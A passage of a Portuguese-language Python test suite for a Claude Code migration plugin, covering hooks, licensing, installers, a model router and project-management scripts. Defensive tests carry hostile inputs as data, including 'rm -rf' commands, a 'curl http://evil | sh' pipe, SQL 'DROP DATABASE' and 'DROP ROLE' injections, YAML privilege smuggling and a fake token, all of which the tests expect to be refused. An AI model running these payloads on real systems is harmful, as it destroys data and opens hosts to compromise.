            self.assertIn("instante", i); self.assertIn("codigo", i); self.assertIn("ms", i)
        # erro tambem entra, com o codigo
        run(SCRIPTS / "arquivar_artefato.py", "--project-root", self.tmp, "--arquivo", self.tmp / "nao-existe.txt", "--tipo", "anotacao", "--onde-usar", "G1")
        linhas = [json.loads(l) for l in logs[0].read_text().splitlines()]
        self.assertTrue(any(i["operacao"] == "arquivar_artefato" and i["codigo"] == 2 for i in linhas))
        # argumento com nome de segredo nao vai para o log
        run(SCRIPTS / "licenca.py", "conferir", "--serial", "SEGREDO-NAO-DEVE-APARECER")
        texto = logs[0].read_text()
        self.assertNotIn("SEGREDO-NAO-DEVE-APARECER", texto)
        # fora de um projeto, nada e gravado
        fora = self.tmp / "fora"; fora.mkdir()
        run(SCRIPTS / "zelador.py", "--project-root", fora, "espaco")
        self.assertFalse((fora / ".wx-migration").exists())
        # negativa de hook entra como operacao
        pedido = {"tool_name": "Write", "cwd": str(self.tmp), "tool_input": {"file_path": str(self.tmp / "artefatos" / "CATALOGO.md"), "content": "x"}}
        subprocess.run([sys.executable, str(RAIZ / "hooks" / "guarda_anexos_e_segredos.py")], input=json.dumps(pedido), capture_output=True, text=True)
        linhas = [json.loads(l) for l in logs[0].read_text().splitlines()]
        self.assertTrue(any(i["operacao"] == "HOOK_guarda_anexos" for i in linhas))
        # o resumo le do arquivo
        r = run(SCRIPTS / "registro.py", "--project-root", self.tmp, "resumo")
        self.assertEqual(r.returncode, 0, r.stderr); self.assertIn("aplicar_questionario", r.stdout)

    def test_hook_nao_barra_leitura_com_redirecionamento_fora(self):
        """Ler de inputs/ e escrever fora e legitimo: o hook confere o ALVO do
        redirecionamento, nao todo caminho citado na linha. Defeito achado pelo
        registro de operacoes, que mostrou duas negativas sem escrita nenhuma."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        hook = RAIZ / "hooks" / "guarda_anexos_e_segredos.py"

        def decide(cmd):
            pedido = {"tool_name": "Bash", "cwd": str(self.tmp), "tool_input": {"command": cmd}}
            p = subprocess.run([sys.executable, str(hook)], input=json.dumps(pedido), capture_output=True, text=True)
            return json.loads(p.stdout)["hookSpecificOutput"]["permissionDecision"] if p.stdout.strip() else "allow"

        # le da evidencia e escreve fora dela: passa
        self.assertEqual(decide("python3 x.py --pdf inputs/a.pdf > /tmp/saida.txt"), "allow")
        self.assertEqual(decide("grep -n HReadSeek inputs/banco.sql | head -3"), "allow")
        # escreve ou apaga dentro: continua negado
        self.assertEqual(decide("echo x > inputs/banco.sql"), "deny")
        self.assertEqual(decide("rm -rf inputs/screenshots"), "deny")
        self.assertEqual(decide("echo y >> artefatos/CATALOGO.md"), "deny")

    def test_pdf_para_markdown_guarda_pagina_hash_e_nao_inventa(self):
        """PDF vira .md com pagina e hash; pagina sem texto vira OCR_REQUERIDO em vez
        de texto inventado; e token no PDF nao chega ao markdown."""
        saida = self.tmp / ".wx-migration/extraidos"
        pdf = self.tmp / "inputs" / "estoque-codigo.pdf"
        r = run(SCRIPTS / "pdf_para_markdown.py", "--pdf", pdf, "--saida", saida, "--linguagem", "wlanguage", "--project-root", self.tmp)
        self.assertEqual(r.returncode, 0, r.stderr)
        md = (saida / "estoque-codigo.md").read_text()
        self.assertIn("<!-- pagina 1 -->", md); self.assertIn("## Página 1", md)
        self.assertRegex(md, r"(?m)^sha256: [0-9a-f]{64}$")
        resumo = json.loads((saida / "estoque-codigo.json").read_text())
        self.assertEqual(len(resumo["sha256"]), 64); self.assertGreater(resumo["paginas"], 0)
        self.assertEqual(resumo["segredos_omitidos"], 0)
        # nao sobrescreve sem --forcar
        r = run(SCRIPTS / "pdf_para_markdown.py", "--pdf", pdf, "--saida", saida, "--project-root", self.tmp)
        self.assertEqual(r.returncode, 2); self.assertIn("ja existe", r.stderr)
        # pagina sem texto vira OCR_REQUERIDO, nao texto inventado
        r = run(SCRIPTS / "pdf_para_markdown.py", "--pdf", pdf, "--saida", saida, "--minimo", "100000", "--forcar", "--project-root", self.tmp)
        self.assertEqual(r.returncode, 0, r.stderr)
        md = (saida / "estoque-codigo.md").read_text()
        self.assertIn("OCR_REQUERIDO", md); self.assertIn("Nada foi inventado aqui", md)

    def test_comando_nao_cita_subcomando_que_nao_existe(self):
        """Comando que manda rodar um subcomando inexistente so falha na hora do uso.
        Este teste le o --help de cada script e confere a PRIMEIRA palavra depois do
        script em cada linha que e mesmo um comando (comeca com python3). Achado
        assim: /wx-claude-code:licenca dizia 'conferir' e 'ativar', que nunca
        existiram."""
        import shlex
        subs = {}
        for s_ in (RAIZ / "skills/conversao-wx/scripts").glob("*.py"):
            h = subprocess.run([sys.executable, str(s_), "--help"], capture_output=True, text=True, timeout=60).stdout
            m = re.search(r"\{([a-z0-9_,\-]+)\}", h)
            subs[s_.name] = set(m.group(1).split(",")) if m else set()
        problemas = []
        conferidos = 0
        for cmd in sorted((RAIZ / "commands").glob("*.md")):
            for linha in cmd.read_text().splitlines():
                # so linha de comando de verdade; prosa que cita um script nao conta
                m = re.match(r'\s*python3\s+"?\$\{CLAUDE_PLUGIN_ROOT\}[^"\s]*/(\w+\.py)"?(.*)$', linha)
                if not m:
                    continue
                script, resto = m.group(1), m.group(2)
                if script not in subs:
                    problemas.append(f"{cmd.name}: {script} nao existe no plugin")
                    continue
                if not subs[script]:
                    continue
                conferidos += 1
                try:
                    tokens = shlex.split(resto.replace("\\", " "), comments=False)
                except ValueError:
                    tokens = resto.split()
                # o subcomando e o primeiro token que nao e opcao NEM valor de opcao:
                # em `--project-root . resumo`, o subcomando e `resumo`, nao o ponto
                primeiro = None
                pular = False
                for tok in tokens:
                    if pular:
                        pular = False
                        continue
                    if tok.startswith("-"):
                        pular = "=" not in tok
                        continue
                    if tok.startswith("<"):
                        continue
                    primeiro = tok
                    break
                if primeiro and primeiro not in subs[script] and not primeiro.startswith("$"):
                    problemas.append(f"{cmd.name}: {script} nao tem subcomando {primeiro!r} (tem: {', '.join(sorted(subs[script]))})")
        self.assertGreater(conferidos, 5, "o teste nao achou linha de comando nenhuma; a heuristica quebrou")
        self.assertEqual(problemas, [], "\n".join(problemas))

    def test_licenca_continua_ligada_nos_hooks(self):
        """A chave nao pode sumir numa refatoracao: o hook de sessao e o de ferramenta
        continuam chamando a licenca, e a chave publica esta no pacote."""
        hooks = json.loads((RAIZ / "hooks" / "hooks.json").read_text())
        chamadas = json.dumps(hooks)
        self.assertIn("licenca.py\\\" hook", chamadas)
        self.assertIn("licenca.py\\\" hook-sessao", chamadas)
        chave = json.loads((RAIZ / "licenca" / "chave-publica.json").read_text())
        self.assertEqual(chave["algoritmo"], "RSA-2048/SHA-256")
        self.assertGreater(int(str(chave["n"]), 16).bit_length(), 2040)
        r = run(SCRIPTS / "licenca.py", "maquina")
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_instaladores_existem_e_o_de_bash_roda_conferindo(self):
        """Os dois instaladores no pacote, o de bash rodando de verdade em modo
        conferencia. O de PowerShell nao roda aqui (nao ha PowerShell neste
        ambiente): confere-se a estrutura, e a prova real fica pendente numa
        maquina Windows -- o que depende do sistema operacional so se prova
        contra o sistema operacional."""
        sh = RAIZ / "instalar.sh"
        ps = RAIZ / "instalar.ps1"
        self.assertTrue(sh.is_file()); self.assertTrue(ps.is_file())
        self.assertTrue(os.access(sh, os.X_OK), "instalar.sh precisa ser executavel")
        self.assertEqual(subprocess.run(["bash", "-n", str(sh)], capture_output=True).returncode, 0, "sintaxe do instalar.sh")
        r = subprocess.run(["bash", str(sh), "--conferir"], capture_output=True, text=True, timeout=300)
        self.assertEqual(r.returncode, 0, r.stderr)
        for esperado in ("Pre-requisitos", "Corpus do Help", "Conferencia do pacote", "nada foi instalado", "Licenca"):
            self.assertIn(esperado, r.stdout, esperado)
        self.assertIn("skills, ", r.stdout)
        # pre-requisito ausente: oferece, mostra o comando e NAO instala sem aprovacao
        env = dict(os.environ, PATH="/usr/bin:/bin:/usr/local/bin")
        r = subprocess.run(["bash", str(sh), "--conferir"], capture_output=True, text=True, timeout=300, env=env, stdin=subprocess.DEVNULL)
        if "claude' nao esta no PATH" in r.stdout:
            self.assertIn("nao instala", r.stdout, "sem terminal ou em --conferir, nada pode ser instalado")
            self.assertNotIn("instalado\n", r.stdout.replace("nao foi instalado", "").replace("nada foi instalado", ""))
        # sem manifesto: oferece baixar, e sem aprovacao para com codigo 1
        vazio = Path(tempfile.mkdtemp())
        r = subprocess.run(["bash", str(sh), "--raiz", str(vazio)], capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 1)
        self.assertIn("baixar o plugin do repositorio agora?", r.stdout)
        self.assertIn("git clone --depth 1", r.stdout)
        self.assertIn("sem terminal interativo: nao instala", r.stdout)
        self.assertFalse((vazio / "adrianoboller").exists(), "clonou sem aprovacao")
        # --conferir nao deixa rastro nem em /tmp (achado na prova real)
        import glob
        self.assertEqual(glob.glob("/tmp/wx-validacao*"), [], "--conferir deixou arquivo temporario para tras")
        # opcao desconhecida para com codigo 2, em vez de fazer algo errado
        r = subprocess.run(["bash", str(sh), "--nao-existe"], capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 2); self.assertIn("desconhecida", r.stderr)
        # PowerShell: estrutura balanceada e os cinco passos presentes
        texto = ps.read_text(encoding="utf-8")
        for a, b in (("{", "}"), ("(", ")"), ("[", "]")):
            self.assertEqual(texto.count(a), texto.count(b), f"{a}{b} desbalanceado no instalar.ps1")
        self.assertEqual(texto.count('@"'), texto.count('"@'), "here-string do instalar.ps1")
        for passo in ("1. Pre-requisitos", "2. Corpus", "3. Conferencia", "4. Instalacao", "5. Licenca"):
            self.assertIn(passo, texto, passo)
        self.assertIn("param(", texto); self.assertIn("$Conferir", texto)
        # o mesmo fluxo de aprovacao do bash, no PowerShell
        for peca in ("function Perguntar", "function InstalarComAprovacao", "function ComandoPara",
                     "$Sim", "UserInteractive", "git clone --depth 1"):
            self.assertIn(peca, texto, peca)

    def test_uiux_vendorizada_com_licenca_e_atribuicao(self):
        """Material de terceiro entra com licenca e origem, ou nao entra. MIT exige o
        texto da licenca e a atribuicao; e as descricoes longas do upstream foram
        encurtadas, com as originais guardadas."""
        base = RAIZ / "skills" / "ui-ux-pro-max"
        self.assertIn("MIT License", (base / "LICENSE").read_text(encoding="utf-8"))
        notice = (base / "NOTICE.md").read_text(encoding="utf-8")
        self.assertIn("nextlevelbuilder/ui-ux-pro-max-skill", notice)
        self.assertIn("Next Level Builder", notice)
        self.assertRegex(notice, r"commit `[0-9a-f]{40}`")
        originais = json.loads((RAIZ / "skills/descricoes-originais-uiux.json").read_text(encoding="utf-8"))
        for nome in ("ui-ux-pro-max", "design", "design-system", "ui-styling", "banner-design", "brand", "slides"):
            txt = (RAIZ / "skills" / nome / "SKILL.md").read_text(encoding="utf-8")
            self.assertIn("origem: nextlevelbuilder", txt, nome)
            desc = re.search(r'^description:\s*(.+)$', txt, re.M).group(1).strip().strip('"')
            self.assertLessEqual(len(desc), 150, f"{nome}: {len(desc)} caracteres")
            self.assertIn(nome, originais, f"{nome} sem a descricao original guardada")
            self.assertGreater(len(originais[nome]), len(desc), nome)
        # a base de dados que da valor a skill veio junto
        dados = base / "data"
        self.assertTrue((dados / "styles.csv").is_file()); self.assertTrue((dados / "colors.csv").is_file())
        self.assertTrue((dados / "ux-guidelines.csv").is_file())

    def test_pre_requisitos_batem_com_o_que_os_scripts_importam(self):
        """PRE-REQUISITOS.md diz que nenhuma dependencia externa e obrigatoria. Este
        teste varre os imports e falha se alguem acrescentar uma sem avisar."""
        import ast
        padrao = set(sys.stdlib_module_names)
        proprios = {p.stem for p in (RAIZ / "skills/conversao-wx/scripts").glob("*.py")}
        externos = {}
        for p in list((RAIZ / "skills/conversao-wx/scripts").glob("*.py")) + list((RAIZ / "hooks").glob("*.py")):
            try:
                arvore = ast.parse(p.read_text(encoding="utf-8"))
            except SyntaxError:
                continue
            for no in ast.walk(arvore):
                nomes = []
                if isinstance(no, ast.Import):
                    nomes = [a.name.split(".")[0] for a in no.names]
                elif isinstance(no, ast.ImportFrom) and no.module and no.level == 0:
                    nomes = [no.module.split(".")[0]]
                for m in nomes:
                    if m not in padrao and m not in proprios:
                        externos.setdefault(m, set()).add(p.name)
        # os unicos aceitos sao os de PDF, e so dentro de try/except
        self.assertLessEqual(set(externos), {"pypdf", "pdfminer"},
                             f"dependencia externa nova: {sorted(set(externos) - {'pypdf', 'pdfminer'})}; atualize PRE-REQUISITOS.md")
        for modulo, arquivos in externos.items():
            for nome in arquivos:
                fonte = (RAIZ / "skills/conversao-wx/scripts" / nome)
                fonte = fonte if fonte.is_file() else (RAIZ / "hooks" / nome)
                texto = fonte.read_text(encoding="utf-8")
                for linha_no, linha in enumerate(texto.splitlines()):
                    if f"import {modulo}" in linha or f"from {modulo}" in linha:
                        anteriores = texto.splitlines()[max(0, linha_no - 6):linha_no]
                        self.assertTrue(any("try:" in a for a in anteriores),
                                        f"{nome}: {modulo} importado fora de try/except; ele e opcional")
        pre = (RAIZ / "PRE-REQUISITOS.md").read_text(encoding="utf-8")
        self.assertIn("Nenhuma dependência externa de Python é obrigatória", pre)
        self.assertIn("Python", pre); self.assertIn("3.11", pre)

    def test_fontes_md_esta_em_dia(self):
        """FONTES.md e inventario medido: se alguem acrescentar arquivo e nao rodar o
        gerador, o documento passa a mentir sobre o pacote."""
        atual = (RAIZ / "FONTES.md").read_text(encoding="utf-8")
        alvo = Path(tempfile.mkdtemp()) / "FONTES.md"
        r = run(RAIZ / "docs/dossie/gerar-fontes.py", alvo)
        self.assertEqual(r.returncode, 0, r.stderr)
        gerado = alvo.read_text(encoding="utf-8")
        # a data e o commit mudam sozinhos; o que importa e a tabela
        def tabela(t):
            return [l for l in t.splitlines() if l.startswith("|")]
        self.assertEqual(tabela(atual), tabela(gerado),
                         "FONTES.md desatualizado: rode python3 docs/dossie/gerar-fontes.py")
        self.assertIn("| Instaladores |", atual)

    def test_skills_erp_presentes_com_descricao_curta(self):
        for nome in ("php-legado-e-destino", "pdf-para-markdown", "ui-ux-pro-max", "design", "design-system",
                     "ui-styling", "banner-design", "brand", "slides", "erp-accounting", "erp-inventory", "erp-brazil-fiscal", "erp-multi-company", "erp-approval-workflows", "erp-lgpd", "erp-integration-reliability", "windev-wlanguage-erp"):
            txt = (RAIZ / "skills" / nome / "SKILL.md").read_text()
            self.assertTrue(txt.startswith("---\n"), nome)
            desc = re.search(r"^description:\s*(.+)$", txt, re.M).group(1).strip().strip('"')
            self.assertLessEqual(len(desc), 150, f"{nome}: {len(desc)} caracteres")
            self.assertIn(f"name: {nome}", txt)

    def test_injecao_no_questionario_e_recusada_antes_de_gravar(self):
        """Valor do questionario vira bash com sudo, SQL de superusuario e YAML: tudo que nao e identificador e recusado."""
        base = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        casos = [
            ("0_empresa_e_projeto.0_15_github.diretorio_destino", '/tmp"; rm -rf ~ #', "0.15 diretorio_destino"),
            ("0_empresa_e_projeto.0_15_github.credencial_ref", "X:-y", "credencial_ref"),
            ("0_empresa_e_projeto.0_15_github.url", "https://github.com/a/b; curl http://evil | sh", "0.15 url"),
            ("K_ambiente.K0_privilegios.usuario_root", "root; id #", "K0 usuario_root"),
            ("K_ambiente.K2_postgresql.banco", "app; DROP DATABASE prod; --", "K2_postgresql banco"),
            ("K_ambiente.K2_postgresql.papeis.0.nome", "u'; DROP ROLE postgres; --", "papel nome"),
            ("K_ambiente.K2_postgresql.senha_ref", 'X}"; id #', "senha_ref"),
            ("K_ambiente.K7_n8n.porta", '5678"]\n    privileged: true', "K7 porta"),
            ("L_contexto_e_implantacao.L3_implantacao.variaveis_de_ambiente.0", "FOO=bar\n      - EVIL=1", "variavel de ambiente"),
            ("K_ambiente.K2_postgresql.senha_do_banco", "hunter2", "senha_do_banco"),
            ("0_empresa_e_projeto.0_1_softhouse.solicitacao", "token ghp_abcdefghijklmnopqrstuvwxyz0123456789", "formato de token"),
        ]
        for caminho, valor, trecho in casos:
            q = json.loads(json.dumps(base)); cur = q; partes = caminho.split(".")
            for k in partes[:-1]:
                cur = cur[int(k)] if isinstance(cur, list) else cur[k]
            if isinstance(cur, list): cur[int(partes[-1])] = valor
            else: cur[partes[-1]] = valor
            (self.tmp / ".wx-migration/qx.json").write_text(json.dumps(q))
            t2 = Path(tempfile.mkdtemp()); shutil.copytree(EXEMPLO / "inputs", t2 / "inputs"); (t2 / ".wx-migration").mkdir()
            shutil.copy(self.tmp / ".wx-migration/qx.json", t2 / ".wx-migration/questionario.json")
            r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", t2 / ".wx-migration/questionario.json", "--project-root", t2, "--plugin-root", RAIZ)
            self.assertEqual(r.returncode, 2, f"{caminho} deveria ser recusado: {r.stdout[-200:]}")
            self.assertIn(trecho, r.stderr, caminho)
            self.assertFalse((t2 / ".wx-migration/ambiente").exists(), caminho); self.assertFalse((t2 / "CLAUDE.md").exists(), caminho)
            self.assertNotIn("hunter2", r.stderr + r.stdout)
            shutil.rmtree(t2, ignore_errors=True)

    def test_verificar_ambiente_mede_e_devolve_3_quando_falta(self):
        q = {"K_ambiente": {"K1_rust": {"instalar_ou_atualizar": True, "versao_minima": "999.0"}, "K6_github": {"ligar_projeto": True}}}
        (self.tmp / "q.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "verificar_ambiente.py", "--questionario", self.tmp / "q.json", "--json")
        self.assertEqual(r.returncode, 3)
        linhas = json.loads(r.stdout)
        rustc = next(l for l in linhas if l["programa"] == "rustc"); self.assertEqual(rustc["estado"], "falta")
        git = next(l for l in linhas if l["programa"] == "git"); self.assertEqual(git["estado"], "ok")
        q["K_ambiente"]["K1_rust"]["versao_minima"] = "1.0"; q["K_ambiente"]["K6_github"]["ligar_projeto"] = False
        (self.tmp / "q.json").write_text(json.dumps(q))
        self.assertEqual(run(SCRIPTS / "verificar_ambiente.py", "--questionario", self.tmp / "q.json").returncode, 0)

    def test_senha_em_texto_puro_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["0_empresa_e_projeto"]["0_15_github"]["senha"] = "abc123"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2)
        self.assertIn("0_15_github.senha", r.stderr)
        self.assertNotIn("abc123", r.stderr + r.stdout)
        self.assertFalse((self.tmp / ".wx-migration/entrega.json").exists())

    def test_pmo_iniciar_le_prazo_e_marcos_do_bloco_0(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar")
        plano = json.loads((self.tmp / ".wx-migration/pmo/plano.json").read_text())
        self.assertEqual(plano["aprovador_padrao"], "Adriano Boller")
        self.assertEqual(plano["prazo_final"], "2026-12-18"); self.assertEqual(plano["gates"]["G4"]["previsto_para"], "2026-10-30")
        st = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "status").stdout
        self.assertIn("Prazo final de entrega: 2026-12-18", st); self.assertIn("180000 BRL", st)

    def test_status_provided_sem_arquivo_e_recusado(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["A_sql"]["arquivos"] = []
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2)
        self.assertIn("provided", r.stderr)

    def test_preflight_do_exemplo_nao_bloqueia_por_schema(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        r = run(SCRIPTS / "wx_preflight.py", "--manifest", self.tmp / ".wx-migration/wx-inputs.manifest.json", "--allowed-evidence-root", self.tmp / "inputs", "--workspace-root", self.tmp, "--output", self.tmp / ".wx-migration/preflight")
        # wx_preflight.py devolve 0 para READY e 2 para CONDITIONAL; BLOCKED e erro de schema tambem dao != 0,
        # por isso o status e conferido na saida, nao no codigo.
        self.assertIn('"status": "CONDITIONAL"', r.stdout, r.stderr)
        rel = sorted((self.tmp / ".wx-migration/preflight/runs").glob("*/report.md"))[-1].read_text()
        for codigo in ("INVALID_SIGNATURE", "SQL_METADATA_MISSING", "EVIDENCE_ROOT", "SCHEMA"):
            self.assertNotIn(codigo, rel, f"{codigo} apareceu no pré-flight do exemplo")


class Roteador(unittest.TestCase):
    def rotear(self, *args):
        r = run(SCRIPTS / "rotear_modelo.py", *args)
        return json.loads(r.stdout), r.returncode

    def test_classes_e_escaladas(self):
        d, _ = self.rotear("--classe", "mecanica"); self.assertEqual(d["modelo"], "haiku")
        d, _ = self.rotear("--classe", "analise", "--sinal", "fiscal"); self.assertEqual(d["modelo"], "opus")
        d, _ = self.rotear("--classe", "mecanica", "--sinal", "conflito"); self.assertEqual(d["modelo"], "sonnet")
        d, _ = self.rotear("--classe", "revisao", "--sinal", "padrao-aprovado"); self.assertEqual((d["modelo"], d["effort"]), ("opus", "max"))
        d, _ = self.rotear("--classe", "decisao", "--indisponivel", "opus"); self.assertEqual(d["modelo"], "sonnet"); self.assertTrue(any("fallback" in m for m in d["motivos"]))

    def test_orcamento_rebaixa_e_bloqueia(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "iniciar")
            orc = tmp / ".wx-migration/pmo/orcamento.json"
            o = json.loads(orc.read_text()); o["gates"]["G1"]["tokens_previstos"] = 1000; orc.write_text(json.dumps(o))
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "gastar", "--gate", "G1", "--modelo", "sonnet", "--tokens", "850")
            d, rc = self.rotear("--project-root", tmp, "--classe", "decisao", "--gate", "G1")
            self.assertEqual((d["modelo"], rc), ("sonnet", 0))
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "gastar", "--gate", "G1", "--modelo", "opus", "--tokens", "200")
            d, rc = self.rotear("--project-root", tmp, "--classe", "analise", "--gate", "G1")
            self.assertEqual((d["estado"], rc), ("BLOQUEADO", 3))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class PMO(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        (self.tmp / ".wx-migration").mkdir()
        (self.tmp / ".wx-migration/traceability.csv").write_text(
            "trace_id,kind,source_artifact,source_locator,source_sha256,legacy_symbol,rule_summary,decision_id,target_component,target_file,target_symbol,test_id,test_file,expected,actual,target_commit,test_result_ref,approved_by,approved_at,status,confidence,notes\n"
            + "".join(f"BR-{i:03d},business_rule,,,,,regra {i},,,,,,,,,,,,,implemented,,\n" for i in range(1, 9))
            + "BR-009,business_rule,,,,,regra 9,,,,,,,,,,,Adriano,,accepted,,\n")
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar", "--aprovador", "Adriano")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_pdca_infrutifero_exige_proxima_e_grava_na_base(self):
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "abrir", "--gate", "G4", "--hipotese", "h1", "--medida", "m", "--criterio", ">= 1,5x")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "infrutifero", "--medido", "1,06x", "--aprendizado", "a")
        self.assertEqual(r.returncode, 2); self.assertIn("proxima", r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "infrutifero", "--medido", "1,06x", "--aprendizado", "a", "--proxima", "h2")
        self.assertEqual(r.returncode, 0, r.stderr)
        base = (self.tmp / ".wx-migration/pmo/base_de_conhecimento.md").read_text()
        self.assertIn("| PDCA-001 |", base); self.assertIn("infrutifero", base)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "frutifero", "--medido", "x", "--aprendizado", "a")
        self.assertEqual(r.returncode, 2)

    def test_kanban_marca_wip_estourado(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "kanban")
        self.assertIn("Em andamento (8 / WIP 6)  **WIP ESTOURADO**", r.stdout)

    def test_sprint_uma_por_vez_e_resumo(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s1", "--objetivo", "o", "--gate", "G4", "--item", "BR-009", "--item", "BR-001")
        self.assertEqual(r.returncode, 0, r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s2", "--objetivo", "o", "--gate", "G4")
        self.assertEqual(r.returncode, 2)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "fechar", "--decisao", "CONDITIONAL")
        self.assertIn("prontos 1/2", r.stdout)
        arq = next((self.tmp / ".wx-migration/pmo/sprints").glob("Bloco0001-SP00001-*.md")); resumo = arq.read_text()
        self.assertIn("## 12. Retrospectiva", resumo); self.assertIn("BR-001", resumo)
        self.assertIn("| Identificação | Bloco0001-SP00001-", resumo)
        import zipfile; self.assertEqual(zipfile.ZipFile(arq.with_suffix(".zip")).namelist(), [arq.name])  # toda sprint tem a copia .md zipada
        ident = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "identificacao").stdout.strip()
        self.assertRegex(ident, r"^Bloco0001-SP00001-.+ · \d{4}-\d{2}-\d{2} \(sprint fechada; abra a próxima\)$")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "bloco", "abrir", "--titulo", "Análise da base de dados", "--gate", "G1")
        self.assertIn("Bloco0002", r.stdout)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "Análise da base de dados", "--objetivo", "o", "--gate", "G1", "--item", "BR-001", "--aprovador", "A")
        self.assertIn("Bloco0002-SP00002-Análise da base de dados", r.stdout)
        h = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "hook-identificacao", entrada="{}").stdout
        self.assertIn("Bloco0002-SP00002-Análise da base de dados ·", h); self.assertIn("UserPromptSubmit", h)

    def test_backlog_com_papel_e_entrega_zipada(self):
        import zipfile
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s1", "--objetivo", "o", "--gate", "G5", "--item", "BR-001:B", "--item", "BR-009:F")
        self.assertEqual(r.returncode, 0, r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "x", "--objetivo", "o", "--gate", "G5", "--item", "BR-002:Z")
        self.assertEqual(r.returncode, 2)
        kb = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "kanban").stdout
        self.assertIn("[B engenheiro] `BR-001`", kb); self.assertIn("[F prova-real] `BR-009`", kb); self.assertIn("[sem papel] `BR-002`", kb)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "fechar", "--decisao", "APPROVED")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "entregar", "--sprint", "1", "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        z = next((self.tmp / ".wx-migration/pmo/entregas").glob("sprint-01-G5-*.zip"))
        nomes = zipfile.ZipFile(z).namelist()
        for n in ("sprint-01/resumo-da-sprint.md", "sprint-01/tecnicas-aplicadas.md", "sprint-01/base-de-conhecimento.md", "sprint-01/ferramentas.md", "sprint-01/kanban.md", "sprint-01/backlog.md"):
            self.assertIn(n, nomes)
        ferr = zipfile.ZipFile(z).read("sprint-01/ferramentas.md").decode()
        self.assertIn("pmo.py", ferr); self.assertIn("golden.py", ferr)
        tec = zipfile.ZipFile(z).read("sprint-01/tecnicas-aplicadas.md").decode()
        self.assertIn("## PDCA", tec); self.assertIn("Fonte:", tec)

    def test_relatorio_e_painel_saem_ao_fechar_sprint_e_na_entrega(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(EXEMPLO / "inputs", tmp / "inputs"); (tmp / ".wx-migration").mkdir()
            shutil.copy(EXEMPLO / "questionario.json", tmp / ".wx-migration" / "questionario.json")
            run(SCRIPTS / "aplicar_questionario.py", "--questionario", tmp / ".wx-migration/questionario.json", "--project-root", tmp, "--plugin-root", RAIZ)
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "iniciar", "--aprovador", "A")
            (tmp / ".wx-migration/traceability.csv").write_text("trace_id,kind,status,notes\nBR-001,business_rule,accepted,\nINT-001,integration,blocked,sem ambiente\n")
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "relatorio").stdout
            for secao in ("## 1. Empresa e contrato", "Prazo final: **2026-12-18**", "| business_rule |", "Itens bloqueados: 1", "| RSK-001 |", "## 11. Próximos passos", "Desbloquear 1 item(ns): INT-001", "credencial em `GITHUB_TOKEN`"):
                self.assertIn(secao, r)
            self.assertNotIn("abc123", r)
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "sprint", "abrir", "--nome", "S1", "--objetivo", "o", "--gate", "G4", "--item", "BR-001:B", "--aprovador", "A")
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "sprint", "fechar", "--decisao", "APPROVED", "--pedido", "")
